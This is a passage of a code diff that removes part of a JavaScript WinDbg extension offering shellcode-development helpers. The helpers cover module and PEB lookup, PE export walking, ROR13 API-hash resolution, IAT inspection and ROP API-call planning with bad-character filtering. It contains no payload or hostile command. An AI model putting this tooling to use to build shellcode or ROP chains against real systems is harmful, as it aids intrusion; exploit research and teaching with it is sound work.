-          ExecutablePages: executablePages.toString()
-        },
-        {
-          Protect: "TOTAL",
-          Name: "TOTAL",
-          Pages: totalPages.toString(),
-          ExecutablePages: executablePages.toString()
-        },
-        ...[...summary.entries()].sort((left, right) => left[0] - right[0]).map(([protect, count]) => {
-          const decoded = decodeProtectValue(protect);
-          return {
-            Protect: `0x${protect.toString(16).toUpperCase().padStart(2, "0")}`,
-            Name: decoded.name,
-            Pages: count.toString(),
-            Executable: decoded.executable ? "yes" : "no",
-            Writable: decoded.writable ? "yes" : "no"
-          };
-        })
-      ];
-      return rows;
-    }
-    base(name) {
-      const lookup = this.findModule(name);
-      if (lookup.kind === "ok") {
-        return [{ Module: lookup.module.name, Base: toDmlAddress(lookup.module.base, "db") }];
-      }
-      if (lookup.kind === "ambiguous") {
-        return this.moduleCandidatesRows(lookup.candidates);
-      }
-      return this.errorRows(`No module matches "${name}".`);
-    }
-    pe(name) {
-      const lookup = this.findModule(name);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        return this.parser.formatHeaderRows(lookup.module);
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    exports(name, filter) {
-      const lookup = this.findModule(name);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        const rows = this.exportResolver.enumerate(lookup.module, filter);
-        if (rows.length === 0) {
-          return this.errorRows("No exports matched the requested filter.");
-        }
-        return rows;
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    resolve(moduleName, symbol) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      const entry = this.exportResolver.resolve(lookup.module, symbol);
-      if (!entry) {
-        return this.errorRows(`Symbol "${symbol}" was not found in ${lookup.module.name}.`);
-      }
-      return [
-        {
-          Module: lookup.module.name,
-          Symbol: `${entry.name} (${lookup.module.name}!${entry.name})`,
-          Address: toDmlAddress(entry.va, "u")
-        }
-      ];
-    }
-    hashes(moduleName, algorithm) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        const exportsList = this.exportResolver.getExports(lookup.module);
-        const rows = this.hashResolver.compute(exportsList, algorithm);
-        if (rows.length === 0) {
-          return this.errorRows("No named exports were found to hash.");
-        }
-        return rows;
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    hashresolve(moduleName, hashValue, algorithm = "ROR13") {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      const parsed = parseHashValue(hashValue);
-      if (parsed === void 0) {
-        return this.errorRows(`Invalid hash value "${String(hashValue)}".`);
-      }
-      try {
-        for (const entry of this.exportResolver.getExports(lookup.module)) {
-          if (!entry.name) {
-            continue;
-          }
-          const hashHex = this.hashResolver.hashValue(entry.name, algorithm).Hash;
-          const computed = parseInt(hashHex.replace(/^0x/i, ""), 16) >>> 0;
-          if (computed === parsed) {
-            const forward = this.exportResolver.isForwarded(lookup.module, entry);
-            return [
-              {
-                Module: lookup.module.name,
-                Algorithm: String(this.hashResolver.hashValue(entry.name, algorithm).Algorithm),
-                Hash: `0x${parsed.toString(16).toUpperCase().padStart(8, "0")}`,
-                Symbol: entry.name,
-                Address: toDmlAddress(entry.va, "u"),
-                Forwarded: forward.forwarded ? "true" : "false",
-                ForwardTo: forward.target || ""
-              }
-            ];
-          }
-        }
-        return this.errorRows(`No symbol matched hash 0x${parsed.toString(16).toUpperCase().padStart(8, "0")}.`);
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    exportdir(moduleName) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        const info2 = this.exportResolver.getExportDirectory(lookup.module);
-        if (!info2) {
-          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
-        }
-        return [
-          { Field: "Module", Value: lookup.module.name },
-          { Field: "Base", Value: toDmlAddress(lookup.module.base, "db") },
-          { Field: "Export RVA", Value: `0x${info2.exportDirectoryRva.toString(16).toUpperCase()}` },
-          { Field: "Export VA", Value: toDmlAddress(info2.exportDirectoryVa, "db") },
-          { Field: "AddressOfNames", Value: `0x${info2.addressOfNamesRva.toString(16).toUpperCase()}` },
-          { Field: "NumberOfFunctions", Value: info2.numberOfFunctions.toString() },
-          { Field: "NumberOfNames", Value: info2.numberOfNames.toString() },
-          { Field: "AddressOfFunctions", Value: `0x${info2.addressOfFunctionsRva.toString(16).toUpperCase()}` },
-          { Field: "AddressOfNameOrdinals", Value: `0x${info2.addressOfNameOrdinalsRva.toString(16).toUpperCase()}` }
-        ];
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    export(moduleName, symbol) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      const requested = symbol == null ? void 0 : symbol.trim();
-      if (!requested) {
-        return this.errorRows(`Symbol is required. Use sc.exports("${lookup.module.name}") to list exported functions.`);
-      }
-      try {
-        const entry = this.exportResolver.resolve(lookup.module, requested);
-        if (!entry) {
-          return this.errorRows(`Symbol "${requested}" was not found in ${lookup.module.name}.`);
-        }
-        const exportDir = this.exportResolver.getExportDirectory(lookup.module);
-        if (!exportDir) {
-          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
-        }
-        const namesVa = lookup.module.base + BigInt(exportDir.addressOfNamesRva);
-        const ordinalsVa = lookup.module.base + BigInt(exportDir.addressOfNameOrdinalsRva);
-        let nameRva = 0;
-        let ordinalIndex = entry.ordinal - exportDir.ordinalBase;
-        for (let i = 0; i < exportDir.numberOfNames; i += 1) {
-          const candidateNameRva = readUint32LE(namesVa + BigInt(i * 4));
-          const candidateOrdinal = readUint16LE(ordinalsVa + BigInt(i * 2));
-          const candidate = readAsciiString2(lookup.module.base + BigInt(candidateNameRva), 512);
-          if (candidate.toLowerCase() === entry.name.toLowerCase()) {
-            nameRva = candidateNameRva;
-            ordinalIndex = candidateOrdinal;
-            break;
-          }
-        }
-        const forward = this.exportResolver.isForwarded(lookup.module, entry);
-        return [
-          { Property: "Name", Value: entry.name || "<unnamed>" },
-          { Property: "Name RVA", Value: `0x${nameRva.toString(16).toUpperCase()}` },
-          { Property: "Name VA", Value: toDmlAddress(lookup.module.base + BigInt(nameRva), "db") },
-          { Property: "Ordinal Index", Value: ordinalIndex.toString() },
-          { Property: "Ordinal", Value: entry.ordinal.toString() },
-          { Property: "Function RVA", Value: `0x${entry.rva.toString(16).toUpperCase()}` },
-          { Property: "Function VA", Value: toDmlAddress(entry.va, "u") },
-          { Property: "Forwarded", Value: forward.forwarded ? "true" : "false" },
-          { Property: "ForwardTo", Value: forward.target || "" }
-        ];
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    exportat(moduleName, ordinalIndex) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        const entry = this.exportResolver.findByOrdinalIndex(lookup.module, ordinalIndex);
-        if (!entry) {
-          return this.errorRows(`Ordinal index ${ordinalIndex} not found in ${lookup.module.name}.`);
-        }
-        const forward = this.exportResolver.isForwarded(lookup.module, entry);
-        return [
-          {
-            Module: lookup.module.name,
-            OrdinalIndex: ordinalIndex.toString(),
-            Ordinal: entry.ordinal.toString(),
-            Name: entry.name || "<unnamed>",
-            RVA: `0x${entry.rva.toString(16).toUpperCase()}`,
-            VA: toDmlAddress(entry.va, "u"),
-            Forwarded: forward.forwarded ? "true" : "false",
-            ForwardTo: forward.target || ""
-          }
-        ];
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    exportwalk(moduleName, symbol = "GetProcAddress", verbose = false) {
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        const headers = this.parser.parseHeaders(lookup.module);
-        const exportDir = this.exportResolver.getExportDirectory(lookup.module);
-        if (!exportDir) {
-          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
-        }
-        const namesVa = lookup.module.base + BigInt(exportDir.addressOfNamesRva);
-        const ordinalsVa = lookup.module.base + BigInt(exportDir.addressOfNameOrdinalsRva);
-        const functionsVa = lookup.module.base + BigInt(exportDir.addressOfFunctionsRva);
-        const rows = [];
-        let matchIndex = -1;
-        let matchName = "";
-        let ordinalIndex = -1;
-        let functionRva = 0;
-        for (let i = 0; i < exportDir.numberOfNames; i += 1) {
-          const nameRva = readUint32LE(namesVa + BigInt(i * 4));
-          const name = readAsciiString2(lookup.module.base + BigInt(nameRva), 512);
-          if (verbose) {
-            rows.push({ Step: "Walk", Value: `${i}: ${name}` });
-          }
-          if (name.toLowerCase() === symbol.trim().toLowerCase()) {
-            matchIndex = i;
-            matchName = name;
-            ordinalIndex = readUint16LE(ordinalsVa + BigInt(i * 2));
-            functionRva = readUint32LE(functionsVa + BigInt(ordinalIndex * 4));
-            break;
-          }
-        }
-        const summary = [
-          { Step: "Resolving", Value: symbol },
-          { Step: "[1] Module base", Value: toDmlAddress(lookup.module.base, "db") },
-          { Step: "[2] DOS header", Value: toDmlAddress(headers.dosHeader, "db") },
-          { Step: "[3] DOS.e_lfanew", Value: `0x${headers.eLfanew.toString(16).toUpperCase()}` },
-          { Step: "[4] NT header", Value: toDmlAddress(headers.ntHeader, "db") },
-          { Step: "[5] Export directory", Value: toDmlAddress(exportDir.exportDirectoryVa, "db") },
-          { Step: "[6] AddressOfNames", Value: toDmlAddress(namesVa, "db") },
-          { Step: "[7] AddressOfNameOrdinals", Value: toDmlAddress(ordinalsVa, "db") },
-          { Step: "[8] AddressOfFunctions", Value: toDmlAddress(functionsVa, "db") }
-        ];
-        if (matchIndex < 0) {
-          summary.push({ Step: "[9] Match", Value: "not found" });
-          return summary.concat(verbose ? rows : []);
-        }
-        const finalVa = lookup.module.base + BigInt(functionRva);
-        const matchedEntry = this.exportResolver.resolve(lookup.module, matchName);
-        const forward = matchedEntry ? this.exportResolver.isForwarded(lookup.module, matchedEntry) : { forwarded: false, target: "" };
-        summary.push(
-          { Step: "[9] Match index", Value: `${matchIndex}: ${matchName}` },
-          { Step: "[10] Ordinal index", Value: ordinalIndex.toString() },
-          { Step: "[11] Function RVA", Value: `0x${functionRva.toString(16).toUpperCase()}` },
-          { Step: "[12] Final VA", Value: toDmlAddress(finalVa, "u") },
-          { Step: "[13] Forwarded", Value: forward.forwarded ? `true (${forward.target})` : "false" }
-        );
-        return summary.concat(verbose ? rows : []);
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    hash(name, algorithm = "ROR13") {
-      const input = name.trim();
-      if (!input) {
-        return this.errorRows("Input string is required.");
-      }
-      try {
-        return [this.hashResolver.hashValue(input, algorithm)];
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    algorithms() {
-      return this.hashResolver.listAlgorithms();
-    }
-    iat(moduleName, filter) {
-      const lookup = moduleName ? this.findModule(moduleName) : this.findMainModule();
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      try {
-        const needle = filter == null ? void 0 : filter.trim().toLowerCase();
-        const rows = this.iatResolver.enumerateIat(lookup.module).filter((entry) => {
-          if (!needle) return true;
-          return entry.symbol.toLowerCase().includes(needle) || entry.importDll.toLowerCase().includes(needle);
-        }).map((entry) => {
-          var _a;
-          return {
-            Owner: toDmlModule(entry.ownerModule),
-            DLL: toDmlModule(entry.importDll),
-            Symbol: toDmlSymbol(entry.importDll, entry.symbol),
-            Ordinal: entry.ordinal ? entry.ordinal.toString() : "",
-            Slot: toDmlAddress(entry.slot, "dps"),
-            Target: toDmlAddress(entry.target, "u"),
-            Module: entry.actualModule ? toDmlModule(entry.actualModule.name) : "unknown",
-            "Symbol+Offset": entry.nearest ? toDmlText(`${entry.nearest.name}+0x${entry.nearest.offset.toString(16).toUpperCase()}`, `u ${formatAddress(entry.target, this.pointerSize)}`) : "",
-            Status: entry.status,
-            Note: (_a = entry.nameWarning) != null ? _a : ""
-          };
-        });
-        if (rows.length === 0) {
-          return this.errorRows(filter ? `No IAT entries in ${lookup.module.name} matched "${filter}".` : `No IAT entries found for ${lookup.module.name}.`);
-        }
-        return rows;
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    iat_find(symbol) {
-      var _a;
-      const needle = symbol.trim().toLowerCase();
-      if (!needle) {
-        return this.errorRows("Symbol substring is required.");
-      }
-      const rows = [];
-      for (const module of this.readModules()) {
-        try {
-          const entries = this.iatResolver.enumerateIat(module);
-          for (const entry of entries) {
-            if (entry.symbol.toLowerCase().includes(needle)) {
-              rows.push({
-                Owner: toDmlModule(entry.ownerModule),
-                DLL: toDmlModule(entry.importDll),
-                Symbol: toDmlSymbol(entry.importDll, entry.symbol),
-                Slot: toDmlAddress(entry.slot, "dps"),
-                Target: toDmlAddress(entry.target, "u"),
-                Module: entry.actualModule ? toDmlModule(entry.actualModule.name) : "unknown",
-                Status: entry.status,
-                Note: (_a = entry.nameWarning) != null ? _a : ""
-              });
-            }
-          }
-        } catch (_error) {
-        }
-      }
-      if (rows.length === 0) {
-        return this.errorRows(`No IAT entries matched "${symbol}".`);
-      }
-      return rows;
-    }
-    iat_ptr(moduleName, symbol) {
-      var _a;
-      const lookup = this.findModule(moduleName);
-      if (lookup.kind !== "ok") {
-        return this.lookupFailureRows(lookup);
-      }
-      const needle = symbol.trim().toLowerCase();
-      if (!needle) {
-        return this.errorRows("Symbol is required.");
-      }
-      try {
-        const match = this.iatResolver.enumerateIat(lookup.module).find((entry) => entry.symbol.toLowerCase() === needle || entry.symbol.toLowerCase().includes(needle));
-        if (!match) {
-          return this.errorRows(`No IAT slot found for "${symbol}" in ${lookup.module.name}.`);
-        }
-        return [
-          {
-            slot: toDmlAddress(match.slot, "dps"),
-            target: toDmlAddress(match.target, "u"),
-            module: match.actualModule ? toDmlModule(match.actualModule.name) : "unknown",
-            symbol: toDmlSymbol(match.importDll, match.symbol),
-            status: match.status,
-            note: (_a = match.nameWarning) != null ? _a : ""
-          }
-        ];
-      } catch (error2) {
-        return this.errorRows(formatError(error2));
-      }
-    }
-    /** Capture a read-only, stopped-debugger snapshot for rop.api_plan. */
-    apiPlan(targetSpec, badchars = []) {
-      const parsed = parseApiSpec(targetSpec);
-      if (!parsed) return { candidates: [], error: 'Target must be "Symbol" or "MODULE!Symbol".' };
-      try {
-        const modules = this.readModules();
-        const targetModules = parsed.module ? modules.filter((module) => moduleNameMatches(module.name, parsed.module)) : modules.filter((module) => this.exportResolver.resolve(module, parsed.symbol) !== void 0);
-        if (targetModules.length === 0) return { candidates: [], error: `No loaded export matches ${targetSpec}.` };
-        if (targetModules.length > 1) {
-          return { candidates: [], error: `Target ${parsed.symbol} is exported by multiple modules; specify MODULE!${parsed.symbol}.` };
-        }
-        const targetModule = targetModules[0];
-        const targetExport = this.exportResolver.resolve(targetModule, parsed.symbol);
-        if (!targetExport) return { candidates: [], error: `No export ${parsed.symbol} in ${targetModule.name}.` };
-        const forward = this.exportResolver.isForwarded(targetModule, targetExport);
-        if (forward.forwarded) {
-          return { candidates: [], error: `${targetModule.name}!${parsed.symbol} is forwarded to ${forward.target}; forwarded target resolution is not yet implemented.` };
-        }
-        const headers = this.parser.parseHeaders(targetModule);
-        const imports = modules.flatMap((owner) => {
-          try {
-            const ownerHeaders = this.parser.parseHeaders(owner);
-            return this.iatResolver.enumerateIat(owner).map((entry) => {
-              var _a, _b, _c, _d;
-              return {
-                ownerModule: owner.name,
-                ownerBase: owner.base,
-                ownerImageBase: ownerHeaders.imageBase,
-                slot: entry.slot,
-                pointer: entry.target,
-                actualModule: (_a = entry.actualModule) == null ? void 0 : _a.name,
-                actualModuleBase: (_b = entry.actualModule) == null ? void 0 : _b.base,
-                importedSymbol: entry.symbol,
-                nearestSymbol: (_c = entry.nearest) == null ? void 0 : _c.name,
-                nearestOffset: (_d = entry.nearest) == null ? void 0 : _d.offset
-              };
-            });
-          } catch (_error) {
-            return [];
-          }
-        });
-        const target = { module: targetModule.name, symbol: targetExport.name, address: targetExport.va, exportRva: targetExport.rva };
-        return {
-          target,
-          candidates: planApiResolution(target, imports, badchars),
-          targetIdentity: {
-            name: targetModule.name,
-            path: targetModule.path,
-            base: targetModule.base,
-            imageBase: headers.imageBase,
-            sizeOfImage: headers.sizeOfImage,
-            timeDateStamp: headers.timeDateStamp,
-            hash: "not-collected"
-          }
-        };
-      } catch (error2) {
-        return { candidates: [], error: formatError(error2) };
-      }
-    }
-    findModule(name) {
-      const needle = normalizeNeedle(name);
-      if (!needle) {
-        return { kind: "not_found", name };
-      }
-      const modules = this.readModules();
-      const scored = modules.map((module) => {
-        const basename = module.name.toLowerCase();
-        const basenameNoExt = basename.endsWith(".dll") ? basename.slice(0, -4) : basename;
-        const fullPath = module.path.toLowerCase();
-        if (basename === needle || basenameNoExt === needle) {
-          return { module, score: 0 };
-        }
-        if (basename.startsWith(needle) || basenameNoExt.startsWith(needle)) {
-          return { module, score: 1 };
-        }
-        if (basename.includes(needle) || basenameNoExt.includes(needle)) {
-          return { module, score: 2 };
-        }
-        if (fullPath.includes(needle)) {
-          return { module, score: 3 };
-        }
-        return void 0;
-      }).filter((entry) => entry !== void 0);
-      if (scored.length === 0) {
-        return { kind: "not_found", name };
-      }
-      const bestScore = Math.min(...scored.map((entry) => entry.score));
-      const candidates2 = scored.filter((entry) => entry.score === bestScore).map((entry) => entry.module).sort((a, b) => a.base < b.base ? -1 : 1);
-      if (candidates2.length === 1) {
-        return { kind: "ok", module: candidates2[0] };
-      }
-      return { kind: "ambiguous", candidates: candidates2 };
-    }
-    findMainModule() {
-      var _a, _b, _c, _d, _e, _f;
-      const modules = this.readModules();
-      if (modules.length === 0) {
-        return { kind: "not_found", name: "<main-executable>" };
-      }
-      const process = host;
-      const executablePath = ((_d = (_c = (_a = process.currentProcess) == null ? void 0 : _a.ExecutablePath) != null ? _c : (_b = process.currentProcess) == null ? void 0 : _b.Path) != null ? _d : "").toLowerCase();
-      const processName = ((_f = (_e = process.currentProcess) == null ? void 0 : _e.Name) != null ? _f : "").toLowerCase();
-      if (executablePath) {
-        const byPath = modules.find((module) => module.path.toLowerCase() === executablePath);
-        if (byPath) {
-          return { kind: "ok", module: byPath };
-        }
-      }
-      if (processName) {
-        const normalized = processName.endsWith(".exe") ? processName : `${processName}.exe`;
-        const byName = modules.find((module) => module.name.toLowerCase() === normalized);
-        if (byName) {
-          return { kind: "ok", module: byName };
-        }
-      }
-      return { kind: "ok", module: modules[0] };
-    }
-    getPebAddress() {
-      var _a, _b, _c, _d, _e, _f, _g;
-      const hostAny = host;
-      const fromPseudo = tryToBigInt((_e = (_d = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.State) == null ? void 0 : _c.PseudoRegisters) == null ? void 0 : _d.General) == null ? void 0 : _e.peb);
-      if (fromPseudo && fromPseudo !== BigInt(0)) {
-        return fromPseudo;
-      }
-      const fromProcess = tryToBigInt((_g = (_f = hostAny.currentProcess) == null ? void 0 : _f.Environment) == null ? void 0 : _g.EnvironmentBlock);
-      if (fromProcess && fromProcess !== BigInt(0)) {
-        return fromProcess;
-      }
-      return void 0;
-    }
-    readModules() {
-      var _a;
-      const hostAny = host;
-      const source = (_a = hostAny.currentProcess) == null ? void 0 : _a.Modules;
-      const items = toArray2(source);
-      return items.map((entry) => {
-        var _a2, _b, _c, _d, _e, _f;
-        const moduleAny = entry;
-        const rawName = (_a2 = moduleAny.Name) != null ? _a2 : "<unknown>";
-        const path = (_b = moduleAny.Path) != null ? _b : rawName;
-        const name = moduleBasename(rawName);
-        const base = (_e = tryToBigInt((_d = (_c = moduleAny.BaseAddress) != null ? _c : moduleAny.Base) != null ? _d : moduleAny.Address)) != null ? _e : BigInt(0);
-        let end = tryToBigInt(moduleAny.EndAddress);
-        const sizeFromModule = tryToBigInt((_f = moduleAny.Size) != null ? _f : moduleAny.Length);
-        if (!end && sizeFromModule && sizeFromModule > BigInt(0)) {
-          end = base + sizeFromModule;
-        }
-        if (!end) {
-          end = base;
-        }
-        const size = end > base ? end - base : BigInt(0);
-        return {
-          name,
-          path,
-          base,
-          end,
-          size
-        };
-      }).filter((module) => module.base !== BigInt(0)).sort((a, b) => a.base < b.base ? -1 : 1);
-    }
-    collectPageProtections(module) {
-      var _a;
-      const counts = /* @__PURE__ */ new Map();
-      const pageSize = BigInt(4096);
-      for (let page = module.base; page < module.end; page += pageSize) {
-        const protect = this.readPageProtection(page);
-        counts.set(protect, ((_a = counts.get(protect)) != null ? _a : 0) + 1);
-      }
-      return counts;
-    }
-    readPageProtection(address) {
-      const output = executeDebuggerCommand(`!vprot ${formatAddress(address, this.pointerSize)}`);
-      const parsed = parseProtectFromVprot(output);
-      if (parsed !== void 0) {
-        return parsed;
-      }
-      throw new Error(`Unable to parse !vprot output for ${formatAddress(address, this.pointerSize)}.`);
-    }
-    isExecutableProtect(protect) {
-      return (protect & 255) === 16 || (protect & 255) === 32 || (protect & 255) === 64 || (protect & 255) === 128;
-    }
-    moduleCandidatesRows(candidates2) {
-      return candidates2.map((module) => ({
-        Base: toDmlAddress(module.base, "db"),
-        End: toDmlAddress(module.end, "db"),
-        Name: module.name,
-        Path: module.path
-      }));
-    }
-    lookupFailureRows(lookup) {
-      if (lookup.kind === "ambiguous") {
-        return this.moduleCandidatesRows(lookup.candidates);
-      }
-      if (lookup.kind === "not_found") {
-        return this.errorRows(`No module matches "${lookup.name}".`);
-      }
-      return this.errorRows(`Unexpected successful module lookup for "${lookup.module.name}".`);
-    }
-    errorRows(message) {
-      return [{ Error: message }];
-    }
-  };
-  function toArray2(value) {
-    if (Array.isArray(value)) {
-      return value;
-    }
-    if (value && typeof value[Symbol.iterator] === "function") {
-      try {
-        return Array.from(value);
-      } catch (_error) {
-        return [];
-      }
-    }
-    return [];
-  }
-  function tryToBigInt(value) {
-    var _a;
-    if (typeof value === "bigint") {
-      return value;
-    }
-    if (typeof value === "number" && Number.isFinite(value)) {
-      return BigInt(Math.max(0, Math.trunc(value)));
-    }
-    if (typeof value === "string") {
-      const text = value.trim();
-      if (/^0x[0-9a-f]+$/i.test(text)) {
-        return BigInt(text);
-      }
-      if (/^[0-9a-f]+$/i.test(text)) {
-        return BigInt(`0x${text}`);
-      }
-      if (/^[0-9]+$/.test(text)) {
-        return BigInt(text);
-      }
-      return void 0;
-    }
-    if (!value || typeof value !== "object") {
-      return void 0;
-    }
-    const addressed = value;
-    const fromAddress = tryToBigInt((_a = addressed.address) != null ? _a : addressed.Address);
-    if (fromAddress !== void 0) {
-      return fromAddress;
-    }
-    const valueOf = value.valueOf;
-    if (typeof valueOf === "function") {
-      const unwrapped = valueOf.call(value);
-      if (unwrapped !== value) {
-        const parsed = tryToBigInt(unwrapped);
-        if (parsed !== void 0) {
-          return parsed;
-        }
-      }
-    }
-    const asString = value.toString;
-    if (typeof asString === "function") {
-      return tryToBigInt(asString.call(value));
-    }
-    return void 0;
-  }
-  function readAsciiString2(address, maxLength) {
-    const chars = [];
-    const chunkSize = 64;
-    for (let offset = 0; offset < maxLength; offset += chunkSize) {
-      const length = Math.min(chunkSize, maxLength - offset);
-      const bytes = tryReadMemory(address + BigInt(offset), length);
-      if (!bytes || bytes.length === 0) {
-        if (chars.length > 0) {
-          break;
-        }
-        throw new Error(`Unable to read ASCII string at 0x${address.toString(16).toUpperCase()}.`);
-      }
-      for (let i = 0; i < bytes.length; i += 1) {
-        const ch = bytes[i];
-        if (ch === 0) {
-          return chars.join("");
-        }
-        chars.push(String.fromCharCode(ch));
-      }
-    }
-    return chars.join("");
-  }
-  function toDmlAddress(address, command2) {
-    const hex5 = `0x${address.toString(16).toUpperCase()}`;
-    return `<link cmd="${command2} ${hex5}">${hex5}</link>`;
-  }
-  function toDmlModule(name) {
-    var _a;
-    const fileName = (_a = name.replace(/\\/g, "/").split("/").pop()) != null ? _a : "";
-    const moduleName = fileName.replace(/\.[^.]+$/, "");
-    if (!moduleName || !/^[A-Za-z0-9_.$?-]+$/.test(moduleName)) {
-      return name;
-    }
-    return toDmlText(name, `lmv m ${moduleName}`);
-  }
-  function toDmlSymbol(moduleName, symbol) {
-    var _a;
-    if (symbol === "<ordinal>" || !/^[A-Za-z0-9_?$@.]+$/.test(symbol)) {
-      return symbol;
-    }
-    const fileName = (_a = moduleName.replace(/\\/g, "/").split("/").pop()) != null ? _a : "";
-    const moduleToken = fileName.replace(/\.[^.]+$/, "");
-    if (!moduleToken || !/^[A-Za-z0-9_.$?-]+$/.test(moduleToken)) {
-      return symbol;
-    }
-    return toDmlText(symbol, `x ${moduleToken}!${symbol}`);
-  }
-  function toDmlText(label, command2) {
-    const escapedLabel = label.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-    return `<link cmd="${command2}">${escapedLabel}</link>`;
-  }
-  function machineToString(machine) {
-    switch (machine) {
-      case 332:
-        return "x86";
-      case 34404:
-        return "x64";
-      default:
-        return "unknown";
-    }
-  }
-  function normalizeNeedle(value) {
-    if (!value) {
-      return "";
-    }
-    return value.trim().toLowerCase();
-  }
-  function formatError(error2) {
-    if (error2 instanceof Error && error2.message) {
-      return error2.message;
-    }
-    return String(error2);
-  }
-  function parseHashValue(value) {
-    if (typeof value === "number") {
-      return Number.isFinite(value) ? value >>> 0 : void 0;
-    }
-    if (typeof value === "bigint") {
-      return Number(value & BigInt(4294967295));
-    }
-    const text = value.trim().toLowerCase();
-    if (!text) {
-      return void 0;
-    }
-    const parsed = text.startsWith("0x") ? parseInt(text, 16) : parseInt(text, 10);
-    if (Number.isNaN(parsed)) {
-      return void 0;
-    }
-    return parsed >>> 0;
-  }
-  function moduleBasename(value) {
-    const normalized = value.trim();
-    if (!normalized) {
-      return "<unknown>";
-    }
-    const parts = normalized.split(/[\\/]+/);
-    return parts[parts.length - 1] || normalized;
-  }
-  function moduleNameMatches(name, requested) {
-    const normalize = (value) => value.trim().toLowerCase().replace(/\.dll$/, "");
-    return normalize(name) === normalize(requested);
-  }
-  function parseApiSpec(value) {
-    const trimmed = value.trim();
-    if (!trimmed) return void 0;
-    const parts = trimmed.split("!");
-    if (parts.length === 1) return { symbol: parts[0].trim() || "" };
-    if (parts.length === 2 && parts[0].trim() && parts[1].trim()) {
-      return { module: parts[0].trim(), symbol: parts[1].trim() };
-    }
-    return void 0;
-  }
-  function createShellcodeNamespace() {
-    const helper = new ShellcodeHelper();
-    const helperHelp = (name) => {
-      const entry = findHelpEntry(name);
-      return renderAndReturn(`Help: ${name}`, entry ? helpRows(entry) : [{ Error: `Unknown helper '${name}'.` }]);
-    };
-    const wantsHelp = (value) => value === "help";
-    const renderAndReturn = (title, rows) => {
-      if (rows.length === 0) {
-        return toDxResult(title, rows);
-      }
-      section(title);
-      if (rows.length > 0 && "Error" in rows[0]) {
-        error(rows[0].Error);
-        return toDxResult(title, rows);
-      }
-      const maxPrintedRows = title === "sc.exports" || title === "sc.hashes" ? 100 : 200;
-      const printedRows = rows.length > maxPrintedRows ? rows.slice(0, maxPrintedRows) : rows;
-      const keys = title === "sc.modules" ? ["Base", "End", "Size", "Name"] : [...new Set(printedRows.flatMap((row) => Object.keys(row)))];
-      table(keys.map((key2) => ({ key: key2, header: key2 })), printedRows);
-      if (printedRows.length < rows.length) {
-        info(`Showing first ${printedRows.length} of ${rows.length} rows. Use a filter argument to narrow output; full rows remain available under .rows.`);
-      }
-      return toDxResult(title, rows);
-    };
-    return {
-      peb: (help) => wantsHelp(help) ? helperHelp("sc.peb") : renderAndReturn("sc.peb", helper.peb()),
-      modules: (help) => wantsHelp(help) ? helperHelp("sc.modules") : renderAndReturn("sc.modules", helper.modules()),
-      module_pages: (name) => wantsHelp(name) ? helperHelp("sc.module_pages") : renderAndReturn("sc.module_pages", helper.modulePages(name)),
-      page_summary: (name) => wantsHelp(name) ? helperHelp("sc.page_summary") : renderAndReturn("sc.page_summary", helper.pageSummary(name)),
-      base: (name) => wantsHelp(name) ? helperHelp("sc.base") : renderAndReturn("sc.base", helper.base(name)),
-      pe: (name) => wantsHelp(name) ? helperHelp("sc.pe") : renderAndReturn("sc.pe", helper.pe(name)),
-      exports: (name, filter) => wantsHelp(name) ? helperHelp("sc.exports") : renderAndReturn("sc.exports", helper.exports(name, filter)),
-      resolve: (module, symbol) => wantsHelp(module) ? helperHelp("sc.resolve") : renderAndReturn("sc.resolve", helper.resolve(module, symbol)),
-      hashes: (module, algorithm) => wantsHelp(module) ? helperHelp("sc.hashes") : renderAndReturn("sc.hashes", helper.hashes(module, algorithm)),
-      hash: (name, algorithm) => wantsHelp(name) ? helperHelp("sc.hash") : renderAndReturn("sc.hash", helper.hash(name, algorithm)),
-      hashresolve: (module, hashValue, algorithm) => wantsHelp(module) ? helperHelp("sc.hashresolve") : renderAndReturn("sc.hashresolve", helper.hashresolve(module, hashValue, algorithm)),
-      algorithms: (help) => wantsHelp(help) ? helperHelp("sc.algorithms") : renderAndReturn("sc.algorithms", helper.algorithms()),
-      exportdir: (module) => wantsHelp(module) ? helperHelp("sc.exportdir") : renderAndReturn("sc.exportdir", helper.exportdir(module)),
-      export: (module, symbol) => wantsHelp(module) ? helperHelp("sc.export") : renderAndReturn("sc.export", helper.export(module, symbol)),
-      exportat: (module, ordinalIndex) => wantsHelp(module) ? helperHelp("sc.exportat") : renderAndReturn("sc.exportat", helper.exportat(module, ordinalIndex)),
